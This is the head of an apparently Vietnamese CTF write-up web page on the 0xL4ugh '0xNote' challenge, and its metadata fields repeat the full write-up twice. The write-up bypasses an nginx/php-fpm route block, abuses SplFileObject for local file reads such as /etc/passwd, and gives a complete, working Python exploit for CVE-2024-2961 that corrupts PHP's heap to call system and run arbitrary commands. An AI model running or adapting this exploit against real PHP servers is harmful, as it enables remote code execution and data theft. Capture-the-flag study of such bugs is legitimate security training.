<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=light data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>OxL4ugh CTF &#183; MSEC</title><meta name=title content="OxL4ugh CTF &#183; MSEC"><link rel=canonical href=https://mtasecurity.github.io/MSEC/web/0xl4ugh/><meta property="og:url" content="https://mtasecurity.github.io/MSEC/web/0xl4ugh/"><meta property="og:site_name" content="MSEC"><meta property="og:title" content="OxL4ugh CTF"><meta property="og:description" content='0xNote # Overview # Backend : fpm Proxy : nginx Giao diện Tuy nhiên bị chặn ở /premium.php Solve # Với cách viết proxy như sau ta có thể bypass bằng việc thêm index.php ngay sau thư mục mà ta bị chặn (premium.php) Cách bypass ở đây Sau khi vào được /premium.php bằng /premium.php/index.php ta thấy được ứng dụng set color không fillter input người dùng Như đoạn code sau nếu có thể kiểm soát được color và note thì có thể tạo ra 1 object mới : Exploit # CHúng ta sẽ dùng SPLFileObject để đọc 1 file bất kì Set path : php://filter/convert.base64-encode/resource=/etc/passwd Set Classname Đọc kết quả Auket lấy được etc/passwd tuy nhiên flag có quyền Owner vậy nên chưa đủ quyền để đọc Nâng quyền # Ngay khi thực hiện được SPLFileObject như ở trên ta cũng có thể biến thể để nâng lên từ đọc file thành RCE từ đoạn tài liệu sau và cái này Sau đây sẽ là PWN CORE , mình đéo biết giải thích như nào nên chạy code thôi ; Vào http://localhost:5000/ để check id import requests from pwn import * import re import base64 import zlib from bs4 import BeautifulSoup session = requests.Session() ## Constant HEAP_SIZE = 2 * 1024 * 1024 BUG = "劄".encode("utf-8") ## Post init function def get_file(url, path): path = f"php://filter/convert.base64-encode/resource={path}" r = session.post(url + &#39;login.php&#39;, data={&#39;username&#39;:&#39;winky&#39;}) r = session.post(url + &#39;index.php&#39;, data={&#39;note&#39;:path}) r = session.post(url + &#39;/premium.php/index.php&#39;, data={&#39;color&#39;: &#39;SplFileObject&#39;}) r = session.get(url + &#39;index.php&#39;) soup = BeautifulSoup(r.text, "html.parser") data = soup.find("div", id="noteContent").get_text(strip=True) return base64.b64decode(data) def compress(data): return zlib.compress(data, 9)[2:-4] def compressed_bucket(data): return chunked_chunk(data, 0x8000) def qpe(data): return "".join(f"={x:02x}" for x in data).upper().encode() def ptr_bucket(*ptrs, size=None): if size is not None: assert len(ptrs) * 8 == size bucket = b"".join(map(p64, ptrs)) bucket = qpe(bucket) bucket = chunked_chunk(bucket) bucket = chunked_chunk(bucket) bucket = chunked_chunk(bucket) bucket = compressed_bucket(bucket) return bucket def chunked_chunk(data, size: int = None): if size is None: size = len(data) + 8 keep = len(data) + len(b"\n\n") size = f"{len(data):x}".rjust(size - keep, "0") return size.encode() + b"\n" + data + b"\n" ## Pwn core class PWN_Core(): def __init__(self, url, command) -> None: self.url = url self.command = command self.info = {} self.heap = None self.pad = 20 class Region(): def __init__(self, start, stop, permissions, path): self.start = int(start) self.stop = int(stop) self.permissions = permissions self.path = path @property def size(self) -> int: return self.stop - self.start def download_file(self, remote_path: str, local_path: str) -> None: data = get_file(self.url, remote_path) Path(local_path).write_bytes(data) def get_regions(self): maps = get_file(self.url, "/proc/self/maps") maps = maps.decode() PATTERN = re.compile( r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)" ) regions = [] for region in [line.strip() for line in maps.strip().split(&#39;\n&#39;)]: if match := PATTERN.match(region): start = int(match.group(1), 16) stop = int(match.group(2), 16) permissions = match.group(3) path = match.group(4) if "/" in path or "[" in path: path = path.rsplit(" ", 1)[-1] else: path = "" current = self.Region(start, stop, permissions, path) regions.append(current) else: print(maps) return regions def _get_region(self, regions: list[Region], *names: str) -> Region: for region in regions: if any(name in region.path for name in names): break return region def find_main_heap(self, regions): heaps = [ region.stop - HEAP_SIZE + 0x40 for region in reversed(regions) if region.permissions == "rw-p" and region.size >= HEAP_SIZE and region.stop & (HEAP_SIZE-1) == 0 and region.path in ("", "[anon:zend_alloc]") ] first = heaps[0] if len(heaps) > 1: heaps = ", ".join(map(hex, heaps)) return first def get_symbols_and_addresses(self) -> None: regions = self.get_regions() LIBC_FILE = "./libc" self.info["heap"] = self.find_main_heap(regions) libc = self._get_region(regions, "libc-", "libc.so") self.download_file(libc.path, LIBC_FILE) self.info["libc"] = ELF(LIBC_FILE, checksec=False) self.info["libc"].address = libc.start def build_exploit_path(self): self.get_symbols_and_addresses() LIBC = self.info["libc"] ADDR_EMALLOC = LIBC.symbols["__libc_malloc"] ADDR_EFREE = LIBC.symbols["__libc_system"] ADDR_EREALLOC = LIBC.symbols["__libc_realloc"] ADDR_HEAP = self.info["heap"] ADDR_FREE_SLOT = ADDR_HEAP + 0x20 ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168 ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10 CS = 0x100 pad_size = CS - 0x18 pad = b"\x00" * pad_size pad = chunked_chunk(pad, len(pad) + 6) pad = chunked_chunk(pad, len(pad) + 6) pad = chunked_chunk(pad, len(pad) + 6) pad = compressed_bucket(pad) step1_size = 1 step1 = b"\x00" * step1_size step1 = chunked_chunk(step1) step1 = chunked_chunk(step1) step1 = chunked_chunk(step1, CS) step1 = compressed_bucket(step1) step2_size = 0x48 step2 = b"\x00" * (step2_size + 8) step2 = chunked_chunk(step2, CS) step2 = chunked_chunk(step2) step2 = compressed_bucket(step2) step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN) step2_write_ptr = chunked_chunk(step2_write_ptr, CS) step2_write_ptr = chunked_chunk(step2_write_ptr) step2_write_ptr = compressed_bucket(step2_write_ptr) step3_size = CS step3 = b"\x00" * step3_size assert len(step3) == CS step3 = chunked_chunk(step3) step3 = chunked_chunk(step3) step3 = chunked_chunk(step3) step3 = compressed_bucket(step3) step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG assert len(step3_overflow) == CS step3_overflow = chunked_chunk(step3_overflow) step3_overflow = chunked_chunk(step3_overflow) step3_overflow = chunked_chunk(step3_overflow) step3_overflow = compressed_bucket(step3_overflow) step4_size = CS step4 = b"=00" + b"\x00" * (step4_size - 1) step4 = chunked_chunk(step4) step4 = chunked_chunk(step4) step4 = chunked_chunk(step4) step4 = compressed_bucket(step4) step4_pwn = ptr_bucket( 0x200000, 0, # free_slot 0, 0, ADDR_CUSTOM_HEAP, # 0x18 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ADDR_HEAP, # 0x140 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, size=CS, ) step4_custom_heap = ptr_bucket( ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18 ) step4_use_custom_heap_size = 0x140 COMMAND = self.command COMMAND = f"kill -9 $PPID; {COMMAND}" COMMAND = COMMAND.encode() + b"\x00" COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00") step4_use_custom_heap = COMMAND step4_use_custom_heap = qpe(step4_use_custom_heap) step4_use_custom_heap = chunked_chunk(step4_use_custom_heap) step4_use_custom_heap = chunked_chunk(step4_use_custom_heap) step4_use_custom_heap = chunked_chunk(step4_use_custom_heap) step4_use_custom_heap = compressed_bucket(step4_use_custom_heap) pages = ( step4 * 3 + step4_pwn + step4_custom_heap + step4_use_custom_heap + step3_overflow + pad * self.pad + step1 * 3 + step2_write_ptr + step2 * 2 ) resource = compress(compress(pages)) resource = base64.b64encode(resource).decode() resource = f"data:text/plain;base64,{resource}" filters = [ # Create buckets "zlib.inflate", "zlib.inflate", # Step 0: Setup heap "dechunk", "convert.iconv.L1.L1", # Step 1: Reverse FL order "dechunk", "convert.iconv.L1.L1", # Step 2: Put fake pointer and make FL order back to normal "dechunk", "convert.iconv.L1.L1", # Step 3: Trigger overflow "dechunk", "convert.iconv.UTF-8.ISO-2022-CN-EXT", # Step 4: Allocate at arbitrary address and change zend_mm_heap "convert.quoted-printable-decode", "convert.iconv.L1.L1", ] filters = "|".join(filters) path = f"php://filter/read={filters}/resource={resource}" return path def solve(): URL = &#39;http://localhost:5000/&#39; command = &#39;id > /tmp/check_id&#39; print(f&#39;[+] Build payload với lệnh: {command}&#39;) path = PWN_Core(URL, command).build_exploit_path() # 2. Gửi Exploit (Chấp nhận lỗi 502/Server Crash) try: print(&#39;[*] Đang gửi payload kích hoạt RCE...&#39;) # Bước này server có thể trả về 502 do tiến trình crash, ta dùng try/except để bỏ qua lỗi # Lưu ý: Không gọi get_file ở đây để đọc kết quả ngay, vì hàm get_file sẽ fail khi parse HTML lỗi # Tự gửi request thủ công để tránh logic parse HTML của hàm get_file exploit_payload = f"php://filter/convert.base64-encode/resource={path}" session.post(URL + &#39;login.php&#39;, data={&#39;username&#39;:&#39;winky&#39;}) session.post(URL + &#39;index.php&#39;, data={&#39;note&#39;: exploit_payload}) session.post(URL + &#39;/premium.php/index.php&#39;, data={&#39;color&#39;: &#39;SplFileObject&#39;}) session.get(URL + &#39;index.php&#39;, timeout=5) # Kích hoạt exploit except Exception as e: # Lỗi 502 hoặc timeout là dấu hiệu tốt (server đang xử lý/crash do exploit) print(f&#39;[!] Server phản hồi/crash (điều này là bình thường với CVE-2024-2961): {e}&#39;) # 3. Đợi hệ thống đồng bộ file import time print(&#39;[*] Đợi 2 giây để lệnh thực thi xong...&#39;) time.sleep(2) # 4. Đọc kết quả từ file /tmp/check_id bằng LFI (Sử dụng lại hàm get_file) print(&#39;[*] Đang đọc kết quả từ /tmp/check_id...&#39;) try: # Dùng chính tính năng SplFileObject để đọc file kết quả result = get_file(URL, "/tmp/check_id") if result: print(&#39;\n[+] KẾT QUẢ COMMAND ID:&#39;) print(&#39;=&#39;*40) print(result.decode(&#39;utf-8&#39;).strip()) print(&#39;=&#39;*40) else: print(&#39;[-] Không đọc được kết quả. Có thể exploit chưa thành công.&#39;) except Exception as e: print(f&#39;[-] Lỗi khi đọc file kết quả: {e}&#39;) if __name__ == "__main__": solve()'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="web"><meta property="og:image" content="https://mtasecurity.github.io/MSEC/web/0xl4ugh/featured.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://mtasecurity.github.io/MSEC/web/0xl4ugh/featured.png"><meta name=twitter:title content="OxL4ugh CTF"><meta name=twitter:description content='0xNote # Overview # Backend : fpm Proxy : nginx Giao diện Tuy nhiên bị chặn ở /premium.php Solve # Với cách viết proxy như sau ta có thể bypass bằng việc thêm index.php ngay sau thư mục mà ta bị chặn (premium.php) Cách bypass ở đây Sau khi vào được /premium.php bằng /premium.php/index.php ta thấy được ứng dụng set color không fillter input người dùng Như đoạn code sau nếu có thể kiểm soát được color và note thì có thể tạo ra 1 object mới : Exploit # CHúng ta sẽ dùng SPLFileObject để đọc 1 file bất kì Set path : php://filter/convert.base64-encode/resource=/etc/passwd Set Classname Đọc kết quả Auket lấy được etc/passwd tuy nhiên flag có quyền Owner vậy nên chưa đủ quyền để đọc Nâng quyền # Ngay khi thực hiện được SPLFileObject như ở trên ta cũng có thể biến thể để nâng lên từ đọc file thành RCE từ đoạn tài liệu sau và cái này Sau đây sẽ là PWN CORE , mình đéo biết giải thích như nào nên chạy code thôi ; Vào http://localhost:5000/ để check id import requests from pwn import * import re import base64 import zlib from bs4 import BeautifulSoup session = requests.Session() ## Constant HEAP_SIZE = 2 * 1024 * 1024 BUG = "劄".encode("utf-8") ## Post init function def get_file(url, path): path = f"php://filter/convert.base64-encode/resource={path}" r = session.post(url + &#39;login.php&#39;, data={&#39;username&#39;:&#39;winky&#39;}) r = session.post(url + &#39;index.php&#39;, data={&#39;note&#39;:path}) r = session.post(url + &#39;/premium.php/index.php&#39;, data={&#39;color&#39;: &#39;SplFileObject&#39;}) r = session.get(url + &#39;index.php&#39;) soup = BeautifulSoup(r.text, "html.parser") data = soup.find("div", id="noteContent").get_text(strip=True) return base64.b64decode(data) def compress(data): return zlib.compress(data, 9)[2:-4] def compressed_bucket(data): return chunked_chunk(data, 0x8000) def qpe(data): return "".join(f"={x:02x}" for x in data).upper().encode() def ptr_bucket(*ptrs, size=None): if size is not None: assert len(ptrs) * 8 == size bucket = b"".join(map(p64, ptrs)) bucket = qpe(bucket) bucket = chunked_chunk(bucket) bucket = chunked_chunk(bucket) bucket = chunked_chunk(bucket) bucket = compressed_bucket(bucket) return bucket def chunked_chunk(data, size: int = None): if size is None: size = len(data) + 8 keep = len(data) + len(b"\n\n") size = f"{len(data):x}".rjust(size - keep, "0") return size.encode() + b"\n" + data + b"\n" ## Pwn core class PWN_Core(): def __init__(self, url, command) -> None: self.url = url self.command = command self.info = {} self.heap = None self.pad = 20 class Region(): def __init__(self, start, stop, permissions, path): self.start = int(start) self.stop = int(stop) self.permissions = permissions self.path = path @property def size(self) -> int: return self.stop - self.start def download_file(self, remote_path: str, local_path: str) -> None: data = get_file(self.url, remote_path) Path(local_path).write_bytes(data) def get_regions(self): maps = get_file(self.url, "/proc/self/maps") maps = maps.decode() PATTERN = re.compile( r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)" ) regions = [] for region in [line.strip() for line in maps.strip().split(&#39;\n&#39;)]: if match := PATTERN.match(region): start = int(match.group(1), 16) stop = int(match.group(2), 16) permissions = match.group(3) path = match.group(4) if "/" in path or "[" in path: path = path.rsplit(" ", 1)[-1] else: path = "" current = self.Region(start, stop, permissions, path) regions.append(current) else: print(maps) return regions def _get_region(self, regions: list[Region], *names: str) -> Region: for region in regions: if any(name in region.path for name in names): break return region def find_main_heap(self, regions): heaps = [ region.stop - HEAP_SIZE + 0x40 for region in reversed(regions) if region.permissions == "rw-p" and region.size >= HEAP_SIZE and region.stop & (HEAP_SIZE-1) == 0 and region.path in ("", "[anon:zend_alloc]") ] first = heaps[0] if len(heaps) > 1: heaps = ", ".join(map(hex, heaps)) return first def get_symbols_and_addresses(self) -> None: regions = self.get_regions() LIBC_FILE = "./libc" self.info["heap"] = self.find_main_heap(regions) libc = self._get_region(regions, "libc-", "libc.so") self.download_file(libc.path, LIBC_FILE) self.info["libc"] = ELF(LIBC_FILE, checksec=False) self.info["libc"].address = libc.start def build_exploit_path(self): self.get_symbols_and_addresses() LIBC = self.info["libc"] ADDR_EMALLOC = LIBC.symbols["__libc_malloc"] ADDR_EFREE = LIBC.symbols["__libc_system"] ADDR_EREALLOC = LIBC.symbols["__libc_realloc"] ADDR_HEAP = self.info["heap"] ADDR_FREE_SLOT = ADDR_HEAP + 0x20 ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168 ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10 CS = 0x100 pad_size = CS - 0x18 pad = b"\x00" * pad_size pad = chunked_chunk(pad, len(pad) + 6) pad = chunked_chunk(pad, len(pad) + 6) pad = chunked_chunk(pad, len(pad) + 6) pad = compressed_bucket(pad) step1_size = 1 step1 = b"\x00" * step1_size step1 = chunked_chunk(step1) step1 = chunked_chunk(step1) step1 = chunked_chunk(step1, CS) step1 = compressed_bucket(step1) step2_size = 0x48 step2 = b"\x00" * (step2_size + 8) step2 = chunked_chunk(step2, CS) step2 = chunked_chunk(step2) step2 = compressed_bucket(step2) step2_write_ptr = b"0\n".ljust(step2_size, b"\x00") + p64(ADDR_FAKE_BIN) step2_write_ptr = chunked_chunk(step2_write_ptr, CS) step2_write_ptr = chunked_chunk(step2_write_ptr) step2_write_ptr = compressed_bucket(step2_write_ptr) step3_size = CS step3 = b"\x00" * step3_size assert len(step3) == CS step3 = chunked_chunk(step3) step3 = chunked_chunk(step3) step3 = chunked_chunk(step3) step3 = compressed_bucket(step3) step3_overflow = b"\x00" * (step3_size - len(BUG)) + BUG assert len(step3_overflow) == CS step3_overflow = chunked_chunk(step3_overflow) step3_overflow = chunked_chunk(step3_overflow) step3_overflow = chunked_chunk(step3_overflow) step3_overflow = compressed_bucket(step3_overflow) step4_size = CS step4 = b"=00" + b"\x00" * (step4_size - 1) step4 = chunked_chunk(step4) step4 = chunked_chunk(step4) step4 = chunked_chunk(step4) step4 = compressed_bucket(step4) step4_pwn = ptr_bucket( 0x200000, 0, # free_slot 0, 0, ADDR_CUSTOM_HEAP, # 0x18 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ADDR_HEAP, # 0x140 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, size=CS, ) step4_custom_heap = ptr_bucket( ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18 ) step4_use_custom_heap_size = 0x140 COMMAND = self.command COMMAND = f"kill -9 $PPID; {COMMAND}" COMMAND = COMMAND.encode() + b"\x00" COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b"\x00") step4_use_custom_heap = COMMAND step4_use_custom_heap = qpe(step4_use_custom_heap) step4_use_custom_heap = chunked_chunk(step4_use_custom_heap) step4_use_custom_heap = chunked_chunk(step4_use_custom_heap) step4_use_custom_heap = chunked_chunk(step4_use_custom_heap) step4_use_custom_heap = compressed_bucket(step4_use_custom_heap) pages = ( step4 * 3 + step4_pwn + step4_custom_heap + step4_use_custom_heap + step3_overflow + pad * self.pad + step1 * 3 + step2_write_ptr + step2 * 2 ) resource = compress(compress(pages)) resource = base64.b64encode(resource).decode() resource = f"data:text/plain;base64,{resource}" filters = [ # Create buckets "zlib.inflate", "zlib.inflate", # Step 0: Setup heap "dechunk", "convert.iconv.L1.L1", # Step 1: Reverse FL order "dechunk", "convert.iconv.L1.L1", # Step 2: Put fake pointer and make FL order back to normal "dechunk", "convert.iconv.L1.L1", # Step 3: Trigger overflow "dechunk", "convert.iconv.UTF-8.ISO-2022-CN-EXT", # Step 4: Allocate at arbitrary address and change zend_mm_heap "convert.quoted-printable-decode", "convert.iconv.L1.L1", ] filters = "|".join(filters) path = f"php://filter/read={filters}/resource={resource}" return path def solve(): URL = &#39;http://localhost:5000/&#39; command = &#39;id > /tmp/check_id&#39; print(f&#39;[+] Build payload với lệnh: {command}&#39;) path = PWN_Core(URL, command).build_exploit_path() # 2. Gửi Exploit (Chấp nhận lỗi 502/Server Crash) try: print(&#39;[*] Đang gửi payload kích hoạt RCE...&#39;) # Bước này server có thể trả về 502 do tiến trình crash, ta dùng try/except để bỏ qua lỗi # Lưu ý: Không gọi get_file ở đây để đọc kết quả ngay, vì hàm get_file sẽ fail khi parse HTML lỗi # Tự gửi request thủ công để tránh logic parse HTML của hàm get_file exploit_payload = f"php://filter/convert.base64-encode/resource={path}" session.post(URL + &#39;login.php&#39;, data={&#39;username&#39;:&#39;winky&#39;}) session.post(URL + &#39;index.php&#39;, data={&#39;note&#39;: exploit_payload}) session.post(URL + &#39;/premium.php/index.php&#39;, data={&#39;color&#39;: &#39;SplFileObject&#39;}) session.get(URL + &#39;index.php&#39;, timeout=5) # Kích hoạt exploit except Exception as e: # Lỗi 502 hoặc timeout là dấu hiệu tốt (server đang xử lý/crash do exploit) print(f&#39;[!] Server phản hồi/crash (điều này là bình thường với CVE-2024-2961): {e}&#39;) # 3. Đợi hệ thống đồng bộ file import time print(&#39;[*] Đợi 2 giây để lệnh thực thi xong...&#39;) time.sleep(2) # 4. Đọc kết quả từ file /tmp/check_id bằng LFI (Sử dụng lại hàm get_file) print(&#39;[*] Đang đọc kết quả từ /tmp/check_id...&#39;) try: # Dùng chính tính năng SplFileObject để đọc file kết quả result = get_file(URL, "/tmp/check_id") if result: print(&#39;\n[+] KẾT QUẢ COMMAND ID:&#39;) print(&#39;=&#39;*40) print(result.decode(&#39;utf-8&#39;).strip()) print(&#39;=&#39;*40) else: print(&#39;[-] Không đọc được kết quả. Có thể exploit chưa thành công.&#39;) except Exception as e: print(f&#39;[-] Lỗi khi đọc file kết quả: {e}&#39;) if __name__ == "__main__": solve()'><link type=text/css rel=stylesheet href=/MSEC/css/main.bundle.min.f29275ec9a06cd0f99442e96f7c1c5a8b1f1f1f98e65f2846b8beffe8797ee2e760933eecb052747f470d68248c81e22b82d8b8b260116d51bcc0d2d9a77a4e6.css integrity="sha512-8pJ17JoGzQ+ZRC6W98HFqLHx8fmOZfKEa4vv/oeX7i52CTPuywUnR/Rw1oJIyB4iuC2LiyYBFtUbzA0tmnek5g=="><script type=text/javascript src=/MSEC/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js integrity="sha512-b0EXSzoFtoCCD+CMrb+l+3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script><script src=/MSEC/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><script defer type=text/javascript id=script-bundle src=/MSEC/js/main.bundle.min.9df4fc14d50efcc9aa4cfc2b6f348e365f421f5ad491278f8f48c0360cf2f93f08882fda6da162d7ace8e5add57c2df4ac46bd3861306b1d4c452cd31f448d64.js integrity="sha512-nfT8FNUO/MmqTPwrbzSONl9CH1rUkSePj0jANgzy+T8IiC/abaFi16zo5a3VfC30rEa9OGEwax1MRSzTH0SNZA==" data-copy=Copy data-copied=Copied></script><script src=/MSEC/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script><link rel=apple-touch-icon sizes=180x180 href=/MSEC/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/MSEC/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/MSEC/favicon-16x16.png><link rel=manifest href=/MSEC/site.webmanifest><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"WEBs","name":"OxL4ugh CTF","headline":"OxL4ugh CTF","abstract":"\u003ch1 class=\u0022relative group\u0022\u003e0xNote\n    \u003cdiv id=\u00220xnote\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022text-primary-300 dark:text-neutral-700 !no-underline\u0022 href=\u0022#0xnote\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e\n    \n\u003c\/h1\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg\n    class=\u0022my-0 rounded-md\u0022\n    loading=\u0022lazy\u0022\n    decoding=\u0022async\u0022\n    fetchpriority=\u0022low\u0022\n    alt=\u0022image\u0022\n    src=\u0022https:\/\/hackmd.io\/_uploads\/ryOk1sVIWx.png\u0022\n    \u003e\u003c\/figure\u003e\n\u003c\/p\u003e\n\n\u003ch2 class=\u0022relative group\u0022\u003eOverview\n    \u003cdiv id=\u0022overview\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022text-primary-300 dark:text-neutral-700 !no-underline\u0022 href=\u0022#overview\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e\n    \n\u003c\/h2\u003e\n\u003cul\u003e\n\u003cli\u003eBackend : \u003cstrong\u003efpm\u003c\/strong\u003e\n\u003cfigure\u003e\u003cimg\n    class=\u0022my-0 rounded-md\u0022\n    loading=\u0022lazy\u0022\n    decoding=\u0022async\u0022\n    fetchpriority=\u0022low\u0022\n    alt=\u0022image\u0022\n    src=\u0022https:\/\/hackmd.io\/_uploads\/SJSBJj4U-l.png\u0022\n    \u003e\u003c\/figure\u003e\n\u003c\/li\u003e\n\u003cli\u003eProxy : \u003cstrong\u003enginx\u003c\/strong\u003e\n\u003cfigure\u003e\u003cimg\n    class=\u0022my-0 rounded-md\u0022\n    loading=\u0022lazy\u0022\n    decoding=\u0022async\u0022\n    fetchpriority=\u0022low\u0022\n    alt=\u0022image\u0022\n    src=\u0022https:\/\/hackmd.io\/_uploads\/HkQCko4LZl.png\u0022\n    \u003e\u003c\/figure\u003e\n\u003c\/li\u003e\n\u003cli\u003eGiao diện\n\u003cfigure\u003e\u003cimg\n    class=\u0022my-0 rounded-md\u0022\n    loading=\u0022lazy\u0022\n    decoding=\u0022async\u0022\n    fetchpriority=\u0022low\u0022\n    alt=\u0022image\u0022\n    src=\u0022https:\/\/hackmd.io\/_uploads\/SkCqlsE8be.png\u0022\n    \u003e\u003c\/figure\u003e\n\u003c\/li\u003e\n\u003cli\u003eTuy nhiên bị chặn ở \u003ccode\u003e\/premium.php\u003c\/code\u003e\u003c\/li\u003e\n\u003c\/ul\u003e\n\n\u003ch2 class=\u0022relative group\u0022\u003eSolve\n    \u003cdiv id=\u0022solve\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022text-primary-300 dark:text-neutral-700 !no-underline\u0022 href=\u0022#solve\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e\n    \n\u003c\/h2\u003e\n\u003cul\u003e\n\u003cli\u003eVới cách viết proxy như sau ta có thể bypass bằng việc thêm \u003ccode\u003eindex.php\u003c\/code\u003e ngay sau thư mục mà ta bị chặn (\u003ccode\u003epremium.php\u003c\/code\u003e)\n\u003cfigure\u003e\u003cimg\n    class=\u0022my-0 rounded-md\u0022\n    loading=\u0022lazy\u0022\n    decoding=\u0022async\u0022\n    fetchpriority=\u0022low\u0022\n    alt=\u0022image\u0022\n    src=\u0022https:\/\/hackmd.io\/_uploads\/BkGVeoVI-x.png\u0022\n    \u003e\u003c\/figure\u003e\n\u003c\/li\u003e\n\u003cli\u003e\u003ca\n  href=\u0022https:\/\/angelica.gitbook.io\/hacktricks\/pentesting-web\/proxy-waf-protections-bypass#php-fpm\u0022\n    target=\u0022_blank\u0022\n  \u003eCách bypass ở đây\u003c\/a\u003e\u003c\/li\u003e\n\u003cli\u003eSau khi vào được \u003ccode\u003e\/premium.php\u003c\/code\u003e bằng \u003ccode\u003e\/premium.php\/index.php\u003c\/code\u003e ta thấy được ứng dụng set color không fillter input người dùng\u003c\/li\u003e\n\u003cli\u003eNhư đoạn code sau nếu có thể kiểm soát được \u003ccode\u003ecolor\u003c\/code\u003e và \u003ccode\u003enote\u003c\/code\u003e thì có thể tạo ra 1 object mới :\n\u003cfigure\u003e\u003cimg\n    class=\u0022my-0 rounded-md\u0022\n    loading=\u0022lazy\u0022\n    decoding=\u0022async\u0022\n    fetchpriority=\u0022low\u0022\n    alt=\u0022image\u0022\n    src=\u0022https:\/\/hackmd.io\/_uploads\/rkKAWiNL-e.png\u0022\n    \u003e\u003c\/figure\u003e\n\u003c\/li\u003e\n\u003c\/ul\u003e\n\n\u003ch2 class=\u0022relative group\u0022\u003eExploit\n    \u003cdiv id=\u0022exploit\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022text-primary-300 dark:text-neutral-700 !no-underline\u0022 href=\u0022#exploit\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e\n    \n\u003c\/h2\u003e\n\u003cul\u003e\n\u003cli\u003eCHúng ta sẽ dùng SPLFileObject để đọc 1 file bất kì\u003c\/li\u003e\n\u003cli\u003eSet path : \u003ccode\u003ephp:\/\/filter\/convert.base64-encode\/resource=\/etc\/passwd\u003c\/code\u003e\n\u003cfigure\u003e\u003cimg\n    class=\u0022my-0 rounded-md\u0022\n    loading=\u0022lazy\u0022\n    decoding=\u0022async\u0022\n    fetchpriority=\u0022low\u0022\n    alt=\u0022image\u0022\n    src=\u0022https:\/\/hackmd.io\/_uploads\/Sy_7VjNUZx.png\u0022\n    \u003e\u003c\/figure\u003e\n\u003c\/li\u003e\n\u003cli\u003eSet Classname\n\u003cfigure\u003e\u003cimg\n    class=\u0022my-0 rounded-md\u0022\n    loading=\u0022lazy\u0022\n    decoding=\u0022async\u0022\n    fetchpriority=\u0022low\u0022\n    alt=\u0022image\u0022\n    src=\u0022https:\/\/hackmd.io\/_uploads\/H1PwVjEIWl.png\u0022\n    \u003e\u003c\/figure\u003e\n\u003c\/li\u003e\n\u003cli\u003eĐọc kết quả\n\u003cfigure\u003e\u003cimg\n    class=\u0022my-0 rounded-md\u0022\n    loading=\u0022lazy\u0022\n    decoding=\u0022async\u0022\n    fetchpriority=\u0022low\u0022\n    alt=\u0022image\u0022\n    src=\u0022https:\/\/hackmd.io\/_uploads\/rkbq4sV8Wx.png\u0022\n    \u003e\u003c\/figure\u003e\n\u003c\/li\u003e\n\u003cli\u003eAuket lấy được 